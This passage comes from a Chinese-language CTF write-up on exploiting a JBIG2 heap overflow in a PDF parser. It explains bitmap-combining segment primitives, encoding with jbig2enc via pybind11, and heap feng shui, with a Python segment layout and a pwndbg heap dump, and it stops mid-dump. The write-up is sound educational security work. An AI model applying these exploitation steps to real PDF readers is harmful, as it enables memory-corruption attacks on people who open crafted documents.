<p> 接下来，若我们指定 imm 为 false，那么这块等价于 pageBitmap 上特定区域的数据，将被存储进 segments 数组中。</p>
</li>
<li><p>若下一次解析 GenericRefinementRegionSeg 时引用了第一步创建的段，那么此时 refBitmap 为第一步创建的 Bitmap。这样当 imm 为 true 时，第一步创建的 Bitmap 将会和 pageBitmap 上指定的位置进行 combine 操作，即位运算。</p>
</li>
<li><p>由于第一步创建的 bitmap 是和 pageBitmap 相关，因此整个过程就等价于</p>
<ul>
<li><p>从 pageBitmap 上<strong>特定位置1</strong>取下一块数据，并保存至 segments 上</p>
</li>
<li><p>从 segments 上取下这块数据，并将其与 pageBitmap 上<strong>特定位置2</strong>进行位运算。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----------------------&gt; x-axis</span><br><span class="line">|</span><br><span class="line">|             .(2)</span><br><span class="line">|</span><br><span class="line">|    .(1)</span><br><span class="line">|</span><br><span class="line">V</span><br><span class="line">y-axis</span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ol>
<p>如此，便达到了<strong>让 pageBitmap 上指定两个位置的数据进行位运算的操作</strong>。我们将使用该操作来一步步构建位运算原语、乃至加法器。</p>
<h3 id="f-TextRegionSeg"><a href="#f-TextRegionSeg" class="headerlink" title="f. TextRegionSeg"></a>f. TextRegionSeg</h3><p>TextRegionSeg 可以<strong>引用</strong>指定的 <strong>SymbolDictSeg</strong>，并对其中的任意 instance 进行操作。</p>
<blockquote>
<p>需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 TextRegionSeg 不能存放在 JBIG2Globals 流中。</p>
</blockquote>
<p>整体流程大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                    GBool lossless, Guint length,</span><br><span class="line">                                    Guint *refSegs, Guint nRefSegs)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; get the symbol bitmaps</span><br><span class="line">    &#x2F;&#x2F; 从所引用的每个段上，将每个 instance 拷贝到 syms 数组中</span><br><span class="line">    syms &#x3D; (JBIG2Bitmap **)gmallocn(numSyms, sizeof(JBIG2Bitmap *));</span><br><span class="line">    kk &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; nRefSegs; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((seg &#x3D; findSegment(refSegs[i])))</span><br><span class="line">        &#123;</span><br><span class="line">            if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict)</span><br><span class="line">            &#123;</span><br><span class="line">                symbolDict &#x3D; (JBIG2SymbolDict *)seg;</span><br><span class="line">                for (k &#x3D; 0; k &lt; symbolDict-&gt;getSize(); ++k)</span><br><span class="line">                &#123;</span><br><span class="line">                    syms[kk++] &#x3D; symbolDict-&gt;getBitmap(k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 执行 readTextRegion 函数，将指定的 syms 与新创建出来的 bitmap 进行 combine 操作</span><br><span class="line">    bitmap &#x3D; readTextRegion(huff, refine, w, h, numInstances,</span><br><span class="line">                            logStrips, numSyms, symCodeTab, symCodeLen, syms,</span><br><span class="line">                            defPixel, combOp, transposed, refCorner, sOffset,</span><br><span class="line">                            huffFSTable, huffDSTable, huffDTTable,</span><br><span class="line">                            huffRDWTable, huffRDHTable,</span><br><span class="line">                            huffRDXTable, huffRDYTable, huffRSizeTable,</span><br><span class="line">                            templ, atx, aty);</span><br><span class="line"></span><br><span class="line">    gfree(syms);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    &#x2F;&#x2F; 将当前 bitmap 与 pageBitmap 进行 combine 操作，传递所引用的 instance 上的值至 pageBitmap 上</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pageH &#x3D;&#x3D; 0xffffffff &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        bitmap-&gt;setSegNum(segNum);</span><br><span class="line">        segments-&gt;append(bitmap);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-JBIG2Encode"><a href="#3-JBIG2Encode" class="headerlink" title="3. JBIG2Encode"></a>3. JBIG2Encode</h3><h3 id="a-encode-Bitmap"><a href="#a-encode-Bitmap" class="headerlink" title="a. encode Bitmap"></a>a. encode Bitmap</h3><p>通过阅读上面关于 Segments 的源代码，我们可以很容易的得知：在诸如 <code>readGenericBitmap</code> 等读入 bitmap 的函数中，hso 会尝试<strong>从外部 JBIG2Stream 流中，使用某种解码器来对读入的 bitmap 进行解码</strong>（例如代码中多次出现 <code>arithDecoder-&gt;decodeInt</code> 等调用）。</p>
<p>因此，作为提供外部 JBIG2Stream 流的我们，需要对写入至 pdf 中的 bitmap 做对应的编码操作。</p>
<p>从最上面的 <code>JBIG2Stream::reset</code> 函数中可以得知，一共由三种解码器：</p>
<ul>
<li><strong>JArithmeticDecoder</strong></li>
<li>JBIG2HuffmanDecoder</li>
<li>JBIG2MMRDecoder</li>
</ul>
<p>而这些解码器的内部算法，如果要让我们徒手撸一个的话 ，那么做题效率就会非常低。因此，我们可以<strong>使用 <code>jbig2enc</code> 库</strong>来帮助我们完成数据编码操作，该库已经实现了 <strong>JArithmeticDecoder</strong> 状态机的编码算法，故我们无需了解内部细节即可完成对 bitmap 的编码过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:agl&#x2F;jbig2enc.git</span><br></pre></td></tr></table></figure>

<p>但是，该库是使用 C++ 编写的，若 exploit 也全部使用 C++ 完成，则工作量较高。因此，我们可以使用 pybind11 来暴露 jbig2enc 中的部分接口给 python，这样编写 exploit 时可以使用 python 语言来完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pybind11-dev</span><br></pre></td></tr></table></figure>

<p>最后需要注意的是，由于 <code>jbig2enc</code> 的接口会<strong>使用到大量的指针</strong>，而<strong>将指针暴露给 python 接口调用</strong>是一个非常不明智的选择（因为如果让 python 来调用需要指针的接口，则会降低开发速度和<strong>提高触发 bug 的几率</strong>），因此我们最好根据当前的需求，即：</p>
<blockquote>
<p>将 bitmap 数据以 JArithmeticDecoder 方式来进行编码。</p>
</blockquote>
<p>来额外编写一个 wrapper C++ 代码，实现三个封装好的结构体/枚举：</p>
<ul>
<li><code>ArithEncoder</code>：调用 jbig2enc 对 bitmap 进行编码的类</li>
<li><code>Bitmap</code>：待被编码的 bitmap 数据</li>
<li><code>ArithEncoder::Proc</code>：<code>ArithEncoder</code> 编码器的状态枚举</li>
</ul>
<p>最后将这三个结构体/枚举 暴露给 python 调用，避免让 python 直接操作指针。</p>
<blockquote>
<p>这一小节所实现的代码，正对应于 exp 中的以下几个文件：</p>
<ul>
<li><code>hso-groupie/exploit/jbig2arith.[cc,h]</code></li>
<li><code>hso-groupie/exploit/jbjbarith.[cc,h]</code></li>
</ul>
</blockquote>
<h3 id="b-encode-segments"><a href="#b-encode-segments" class="headerlink" title="b. encode segments"></a>b. encode segments</h3><p>hso 在 read segments 时，首先会读取出每个当前 segment 的 段号 segNum、segFlags、refFlags 等一系列字段和标志，之后才是进行（可能的） bitmap 读取。</p>
<p>这些字段和标志同样是需要我们手动放进 JBIG2Stream 中。由于这里的字段和标志不需要使用解码器进行解码，因此可以手动编写代码将字段一个个放置进流中。</p>
<p>这一步的操作位于 exp 中的 <code>hso-groupie/exploit/jbig2.py</code> ，该脚本为所有用到的 segment 都编写了一个对应的 <strong>python 结构转 JBIG2Stream 字节流</strong>的操作；同时，上一节中暴露给 python 所调用的 bitmap encoder 接口，也是在该脚本中所使用。</p>
<p>这样，当我们使用 python 设计好一个个特定的 segments 后，我们便可以将这些 segments 快速转换成 JBIG2Stream 流数据，方便快捷。</p>
<h2 id="五、漏洞利用流程"><a href="#五、漏洞利用流程" class="headerlink" title="五、漏洞利用流程"></a>五、漏洞利用流程</h2><h3 id="1-堆风水"><a href="#1-堆风水" class="headerlink" title="1. 堆风水"></a>1. 堆风水</h3><h3 id="a-创建堆空洞"><a href="#a-创建堆空洞" class="headerlink" title="a. 创建堆空洞"></a>a. 创建堆空洞</h3><p>先放上这张镇楼图：</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095544.jpg" alt=""></p>
<p>为了利用这个堆溢出漏洞，我们需要充分发动堆风水，将指定的结构放至对应的堆块。这里，我们的堆风水需要完成以下几个目标：</p>
<ul>
<li><p>让 pdf 在解析 TextRegionSeg 时，其创建的 syms 指针数组位于 <code>undersized syms buffer</code> 处</p>
</li>
<li><p>让内含<strong>存放超多指针的 JBIG2SymbolDict 结构体</strong>的 segment 放置在 <code>segments GList backing buffer</code> 处</p>
<blockquote>
<p>这里，我们打算让 JBIG2SymbolDict 结构体存放至 global segment 中，因为 SymbolDictSegment 不依赖与任何的 Segments，但是后续的 TextRegionSegment 会依赖这些 SymbolDictSegment。</p>
</blockquote>
</li>
<li><p>让 pageBitmap 结构体占据图中 <code>JBIG2Bitmap</code> 那块内存，并让其 data 占据图中上面 <code>bitmap backing buffer</code> 那块内存。</p>
<blockquote>
<p>通读代码，我们可以得知绝大多数 segments 在解析时，都可以让其 bitmap 与 pageBitmap 进行运算，并将结果保存在 pageBitmap 上。因此让 pageBitmap 拥有越界读写的能力是最好的选择。</p>
</blockquote>
</li>
</ul>
<p>我们先尝试在 global segment 中分配三个不同 Bitmap 大小的 SymbolDict 出来。这里分配不同大小的 SymbolDict 是为了后续在 TextRegionSeg 中，排列组合 size 至溢出，因此这三个堆块的位置<strong>不需要关心</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># global segment</span><br><span class="line">global_file &#x3D; [</span><br><span class="line">    SymbolDict(0, [Bitmap(1, 1)] * 0x10000),</span><br><span class="line">    SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow &#x2F;&#x2F; 8)),</span><br><span class="line">    SymbolDict(2, [Bitmap(1, 1)]),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其中 size_to_overflow 为上图中 overflow 的字节数，具体计算过程稍后介绍。</p>
</blockquote>
<p>此时我们看看分配完这三个 SymbolDict 后的 bins 是什么情况，可以看到<strong>有大量的碎片堆块</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  4]: 0x55555579f8e0 —▸ 0x5555557b9550 —▸ 0x5555557b0c10 —▸ 0x5555557b0c60 ◂— 0x0</span><br><span class="line">0x30 [  5]: 0x5555557ab330 —▸ 0x5555557b0c30 —▸ 0x5555557b0c80 —▸ 0x555555799280 —▸ 0x5555557992d0 ◂— 0x0</span><br><span class="line">0x40 [  7]: 0x5555557f7f90 —▸ 0x5555557f8f10 —▸ 0x5555557f9100 —▸ 0x5555557f7bb0 —▸ 0x5555557fe710 —▸ 0x5555557a0320 —▸ 0x555555797210 ◂— 0x0</span><br><span class="line">0x50 [  1]: 0x5555557a02b0 ◂— 0x0</span><br><span class="line">0x60 [  4]: 0x5555557ab3c0 —▸ 0x5555557a9e40 —▸ 0x5555557ab890 —▸ 0x5555557ab790 ◂— 0x0</span><br><span class="line">0x70 [  1]: 0x5555557ac760 ◂— 0x0</span><br><span class="line">0x90 [  1]: 0x5555557b94c0 ◂— 0x0</span><br><span class="line">0xa0 [  3]: 0x555555798e00 —▸ 0x5555557b6930 —▸ 0x5555557b6a10 ◂— 0x0</span><br><span class="line">0xb0 [  2]: 0x5555557ba520 —▸ 0x5555557b9410 ◂— 0x0</span><br><span class="line">0xc0 [  3]: 0x5555557bec00 —▸ 0x5555557bf620 —▸ 0x5555557b1220 ◂— 0x0</span><br><span class="line">0xd0 [  5]: 0x555555799ec0 —▸ 0x5555557b0cb0 —▸ 0x5555557c5400 —▸ 0x5555557c37f0 —▸ 0x5555557bfcf0 ◂— 0x0</span><br><span class="line">0xe0 [  3]: 0x5555557be4b0 —▸ 0x5555557a9a30 —▸ 0x5555557bc750 ◂— 0x0</span><br><span class="line">0xf0 [  3]: 0x5555557c6d30 —▸ 0x5555557bd370 —▸ 0x5555557bd4a0 ◂— 0x0</span><br><span class="line">0x100 [  2]: 0x5555557c4360 —▸ 0x5555557c44a0 ◂— 0x0</span><br><span class="line">0x110 [  1]: 0x555555797100 ◂— 0x0</span><br><span class="line">0x120 [  2]: 0x5555557c1000 —▸ 0x5555557c5880 ◂— 0x0</span><br><span class="line">0x140 [  3]: 0x5555557c7c80 —▸ 0x5555557c7430 —▸ 0x5555557cc180 ◂— 0x0</span><br><span class="line">0x150 [  3]: 0x5555557cdac0 —▸ 0x5555557c83f0 —▸ 0x5555557c8590 ◂— 0x0</span><br><span class="line">0x160 [  2]: 0x55555579fc00 —▸ 0x5555557a4420 ◂— 0x0</span><br><span class="line">0x170 [  3]: 0x555555797c20 —▸ 0x5555557d36c0 —▸ 0x5555557d3550 ◂— 0x0</span><br><span class="line">0x180 [  2]: 0x5555557bff50 —▸ 0x5555557d8010 ◂— 0x0</span><br><span class="line">0x190 [  7]: 0x5555557adb80 —▸ 0x5555557d8530 —▸ 0x5555557ad570 —▸ 0x5555557ac7d0 —▸ 0x5555557a8710 —▸ 0x5555557a8d60 —▸ 0x5555557aad00 ◂— 0x0</span><br><span class="line">0x1a0 [  2]: 0x5555557d2890 —▸ 0x5555557ad700 ◂— 0x0</span><br><span class="line">0x1b0 [  2]: 0x5555557a8ef0 —▸ 0x5555557aea50 ◂— 0x0</span><br><span class="line">0x1c0 [  2]: 0x5555557d1bb0 —▸ 0x55555579ad70 ◂— 0x0</span><br><span class="line">0x1d0 [  2]: 0x555555796b00 —▸ 0x555555796640 ◂— 0x0</span><br><span class="line">0x1f0 [  2]: 0x5555557a6410 —▸ 0x5555557a6220 ◂— 0x0</span><br><span class="line">0x200 [  2]: 0x55555576a670 —▸ 0x5555557aae90 ◂— 0x0</span><br><span class="line">0x220 [  2]: 0x5555557d8310 —▸ 0x5555557ac960 ◂— 0x0</span><br><span class="line">0x230 [  1]: 0x5555557bd980 ◂— 0x0</span><br><span class="line">0x270 [  1]: 0x5555557ba6d0 ◂— 0x0</span><br><span class="line">0x2b0 [  1]: 0x5555557abdc0 ◂— 0x0</span><br><span class="line">0x2c0 [  1]: 0x555555798320 ◂— 0x0</span><br><span class="line">0x2e0 [  1]: 0x5555557aa730 ◂— 0x0</span><br><span class="line">0x300 [  2]: 0x5555557a5c60 —▸ 0x5555557a9590 ◂— 0x0</span><br><span class="line">0x310 [  7]: 0x5555557ae510 —▸ 0x5555557ac110 —▸ 0x5555557ad010 —▸ 0x5555557abab0 —▸ 0x5555557a9280 —▸ 0x5555557aa420 —▸ 0x5555557a76c0 ◂— 0x0</span><br><span class="line">0x320 [  3]: 0x555555799f90 —▸ 0x5555557becc0 —▸ 0x5555557bab30 ◂— 0x0</span><br><span class="line">0x350 [  2]: 0x5555557bcb40 —▸ 0x5555557c3bd0 ◂— 0x0</span><br><span class="line">0x390 [  1]: 0x5555557a88a0 ◂— 0x0</span><br><span class="line">0x3b0 [  2]: 0x555555797250 —▸ 0x5555557a79d0 ◂— 0x0</span><br><span class="line">0x3c0 [  1]: 0x5555557d39d0 ◂— 0x0</span><br><span class="line">0x3d0 [  1]: 0x5555557cccc0 ◂— 0x0</span><br><span class="line">0x400 [  1]: 0x55555576aa50 ◂— 0x0</span><br><span class="line">0x410 [  3]: 0x555555797810 —▸ 0x5555557bf1d0 —▸ 0x5555557a7f90 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555558304b0 —▸ 0x7ffff7ad8c00 (main_arena+96) ◂— 0x5555558304b0</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x5555557a99e0 —▸ 0x7ffff7ad8c10 (main_arena+112) ◂— 0x5555557a99e0</span><br><span class="line">0xb0: 0x5555557f82f0 —▸ 0x7ffff7ad8ca0 (main_arena+256) ◂— 0x5555557f82f0</span><br><span class="line">0xf0: 0x5555557d0ab0 —▸ 0x7ffff7ad8ce0 (main_arena+320) ◂— 0x5555557d0ab0</span><br><span class="line">0x120: 0x5555557992f0 —▸ 0x7ffff7ad8d10 (main_arena+368) ◂— 0x5555557992f0</span><br><span class="line">0x190: 0x5555557f7df0 —▸ 0x5555557f8d70 —▸ 0x5555557f8f60 —▸ 0x5555557f7a10 —▸ 0x5555557fe570 ◂— ...</span><br><span class="line">0x1c0 [corrupted]</span><br><span class="line">FD: 0x5555557f1a30 —▸ 0x5555557f4780 —▸ 0x5555557d15f0 —▸ 0x5555557e49d0 —▸ 0x55555579ecf0 ◂— ...</span><br><span class="line">BK: 0x5555557d0c90 —▸ 0x5555557d06f0 —▸ 0x5555557d1410 —▸ 0x5555557d0e70 —▸ 0x55555579e390 ◂— ...</span><br><span class="line">0x1d0 [corrupted]</span><br><span class="line">FD: 0x5555557f9910 —▸ 0x5555557f9720 —▸ 0x5555557f85b0 —▸ 0x5555557fe960 —▸ 0x5555557f66b0 ◂— ...</span><br><span class="line">BK: 0x5555557f9530 —▸ 0x5555557f9150 —▸ 0x5555557fb050 —▸ 0x5555557fdd90 —▸ 0x5555557fd1e0 ◂— ...</span><br><span class="line">0x1e0 [corrupted]</span><br><span class="line">FD: 0x5555557a13c0 —▸ 0x5555557a0bc0 —▸ 0x5555557a11c0 —▸ 0x5555557a0570 —▸ 0x5555557a0770 ◂— ...</span><br><span class="line">BK: 0x5555557fcbf0 —▸ 0x5555557fc9f0 —▸ 0x5555557fdb90 —▸ 0x5555557fe760 —▸ 0x5555557fc210 ◂— ...</span><br><span class="line">0x1f0: 0x5555557ba930 —▸ 0x5555557f1120 —▸ 0x5555557d19b0 —▸ 0x5555557befd0 —▸ 0x7ffff7ad8de0 (main_arena+576) ◂— ...</span><br><span class="line">0x200: 0x5555557a9b00 —▸ 0x5555557df570 —▸ 0x5555557a8500 —▸ 0x7ffff7ad8df0 (main_arena+592) ◂— 0x5555557a9b00</span><br><span class="line">0x220 [corrupted]</span><br><span class="line">FD: 0x5555557f3c20 —▸ 0x5555557ecce0 —▸ 0x5555557e8180 —▸ 0x5555557f57f0 —▸ 0x5555557ee5a0 ◂— ...</span><br><span class="line">BK: 0x5555557f4540 —▸ 0x5555557f2130 —▸ 0x5555557f27e0 —▸ 0x5555557eec60 —▸ 0x5555557f2ea0 ◂— ...</span><br><span class="line">0x230 [corrupted]</span><br><span class="line">FD: 0x5555557ae810 —▸ 0x5555557f49d0 —▸ 0x5555557e2710 —▸ 0x5555557f4c20 —▸ 0x5555557a0970 ◂— ...</span><br><span class="line">BK: 0x5555557f0a20 —▸ 0x5555557a23a0 —▸ 0x5555557e5a20 —▸ 0x5555557a3d20 —▸ 0x5555557a3f70 ◂— ...</span><br><span class="line">0x240 [corrupted]</span><br><span class="line">FD: 0x5555557f5590 —▸ 0x5555557f1330 —▸ 0x5555557e3730 —▸ 0x5555557f4e70 —▸ 0x5555557a1ef0 ◂— ...</span><br><span class="line">BK: 0x5555557ec840 —▸ 0x5555557f50d0 —▸ 0x5555557a4660 —▸ 0x5555557e4090 —▸ 0x5555557f5330 ◂— ...</span><br><span class="line">0x250: 0x55555579a760 —▸ 0x7ffff7ad8e40 (main_arena+672) ◂— 0x55555579a760</span><br><span class="line">0x270 [corrupted]</span><br><span class="line">FD: 0x5555557dd3a0 —▸ 0x5555557e1a10 —▸ 0x5555557e0810 —▸ 0x5555557e02e0 —▸ 0x5555557e0aa0 ◂— ...</span><br><span class="line">BK: 0x5555557a54a0 —▸ 0x5555557a5210 —▸ 0x5555557e1f40 —▸ 0x5555557e0aa0 —▸ 0x5555557e02e0 ◂— ...</span><br><span class="line">0x280 [corrupted]</span><br><span class="line">FD: 0x5555557c7560 —▸ 0x5555557b0d70 —▸ 0x5555557e0570 —▸ 0x5555557df2d0 —▸ 0x5555557df810 ◂— ...</span><br><span class="line">BK: 0x5555557e21d0 —▸ 0x5555557deaf0 —▸ 0x5555557df030 —▸ 0x5555557e2470 —▸ 0x5555557ded90 ◂— ...</span><br><span class="line">0x290: 0x5555557acb70 —▸ 0x5555557ddb10 —▸ 0x5555557e0030 —▸ 0x5555557e1760 —▸ 0x5555557de5a0 ◂— ...</span><br><span class="line">0x2a0: 0x5555557dfd70 —▸ 0x5555557dfab0 —▸ 0x7ffff7ad8e90 (main_arena+752) ◂— 0x5555557dfd70</span><br><span class="line">0x2c0: 0x5555557a5f50 —▸ 0x5555557f5c90 —▸ 0x7ffff7ad8eb0 (main_arena+784) ◂— 0x5555557a5f50 &#x2F;* &#39;P_zUUU&#39; *&#x2F;</span><br><span class="line">0x340: 0x5555557f5f70 —▸ 0x5555557ac410 —▸ 0x7ffff7ad8f30 (main_arena+912) ◂— 0x5555557f5f70</span><br><span class="line">0x380: 0x5555557c69a0 —▸ 0x7ffff7ad8f70 (main_arena+976) ◂— 0x5555557c69a0</span><br><span class="line">0x390: 0x5555557d7c70 —▸ 0x7ffff7ad8f80 (main_arena+992) ◂— 0x5555557d7c70 &#x2F;* &#39;p|&#125;UUU&#39; *&#x2F;</span><br><span class="line">0x3b0: 0x5555557c54c0 —▸ 0x7ffff7ad8fa0 (main_arena+1024) ◂— 0x5555557c54c0</span><br><span class="line">0x3f0: 0x5555557bd580 —▸ 0x7ffff7ad8fe0 (main_arena+1088) ◂— 0x5555557bd580</span><br><span class="line">largebins</span><br><span class="line">0x580: 0x5555557cc2b0 —▸ 0x555555797d80 —▸ 0x7ffff7ad9050 (main_arena+1200) ◂— 0x5555557cc2b0</span><br><span class="line">0x600: 0x5555557c7db0 —▸ 0x7ffff7ad9070 (main_arena+1232) ◂— 0x5555557c7db0</span><br><span class="line">0x640: 0x5555557be580 —▸ 0x7ffff7ad9080 (main_arena+1248) ◂— 0x5555557be580</span><br><span class="line">0x780: 0x5555557ea9f0 —▸ 0x5555557cb9e0 —▸ 0x7ffff7ad90d0 (main_arena+1328) ◂— 0x5555557ea9f0</span><br><span class="line">0x800: 0x5555557985d0 —▸ 0x7ffff7ad90f0 (main_arena+1360) ◂— 0x5555557985d0</span><br><span class="line">0x840: 0x5555557cdc00 —▸ 0x7ffff7ad9100 (main_arena+1376) ◂— 0x5555557cdc00</span><br><span class="line">0x900: 0x5555557bdba0 —▸ 0x7ffff7ad9130 (main_arena+1424) ◂— 0x5555557bdba0</span><br><span class="line">0x940: 0x5555557e77f0 —▸ 0x5555557e9b00 —▸ 0x7ffff7ad9140 (main_arena+1440) ◂— 0x5555557e77f0</span><br><span class="line">0x980: 0x5555557d86b0 —▸ 0x5555557ebea0 —▸ 0x7ffff7ad9150 (main_arena+1456) ◂— 0x5555557d86b0</span><br><span class="line">0x9c0: 0x555555795c40 —▸ 0x7ffff7ad9160 (main_arena+1472) ◂— 0x555555795c40 &#x2F;* &#39;@\\yUUU&#39; *&#x2F;</span><br><span class="line">0xa00: 0x5555557cd080 —▸ 0x7ffff7ad9170 (main_arena+1488) ◂— 0x5555557cd080</span><br><span class="line">0xa40: 0x555555799440 —▸ 0x5555557d1e40 —▸ 0x7ffff7ad9180 (main_arena+1504) ◂— 0x555555799440</span><br><span class="line">0xac0: 0x5555557e83c0 —▸ 0x5555557e6100 —▸ 0x7ffff7ad91a0 (main_arena+1536) ◂— 0x5555557e83c0</span><br><span class="line">0xb00: 0x5555557d2a20 —▸ 0x7ffff7ad91b0 (main_arena+1552) ◂— 0x5555557d2a20 &#x2F;* &#39; *&#125;UUU&#39; *&#x2F;</span><br><span class="line">0xb40: 0x5555557e6c70 —▸ 0x5555557feb50 —▸ 0x7ffff7ad91c0 (main_arena+1568) ◂— 0x5555557e6c70 &#x2F;* &#39;pl~UUU&#39; *&#x2F;</span><br><span class="line">0xc40: 0x5555557eb210 —▸ 0x5555557e8ea0 —▸ 0x7ffff7ad9200 (main_arena+1632) ◂— 0x5555557eb210</span><br><span class="line">0xe00: 0x5555557c00c0 —▸ 0x5555557b9630 —▸ 0x5555557c4590 —▸ 0x7ffff7ad9210 (main_arena+1648) ◂— 0x5555557c00c0</span><br><span class="line">0x1400: 0x5555557b5420 —▸ 0x7ffff7ad9240 (main_arena+1696) ◂— 0x5555557b5420 &#x2F;* &#39; T&#123;UUU&#39; *&#x2F;</span><br><span class="line">0x1600: 0x5555557ce770 —▸ 0x7ffff7ad9250 (main_arena+1712) ◂— 0x5555557ce770</span><br><span class="line">0x1800: 